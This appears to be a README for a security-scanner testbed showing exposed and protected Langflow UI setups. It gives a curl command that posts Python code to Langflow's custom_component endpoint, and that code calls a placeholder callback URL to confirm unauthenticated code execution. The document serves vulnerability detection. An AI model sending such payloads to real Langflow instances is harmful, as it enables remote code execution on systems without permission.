# Langflow Exposed UI

Langflow is a tool for building and deploying AI-powered agents and workflows.
This testbed demonstrates exposed and non-exposed configurations of langflow UI.

## Safe setup

```shell
LANGFLOW_AUTO_LOGIN=false docker compose up -d
```

## Vulnerable setup

```shell
LANGFLOW_AUTO_LOGIN=true docker compose up -d
```

## Reproduction Steps

Issue the following curl command to get a pingback from the docker compose.

```sh
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"code\":\"import requests\\n\\nfrom langflow.custom import Component\\n\\nclass TsunamiComponent(Component):\\n    def __init__(self, *args, **kwargs):\\n        super().__init__(*args, **kwargs)\\n        requests.get(\\\"https://<YOUR CALLBACK URL>\\\", timeout=5)\\n\\n\"}' \
    $'http://127.0.0.1:7860/api/v1/custom_component'
```

- Safe instances will return `403 FORBIDDEN`
- Vulnerable instances will return `200 OK`

## References

- <https://github.com/langflow-ai/langflow/tree/main>
- <https://docs.langflow.org/configuration-authentication#langflow_auto_login>
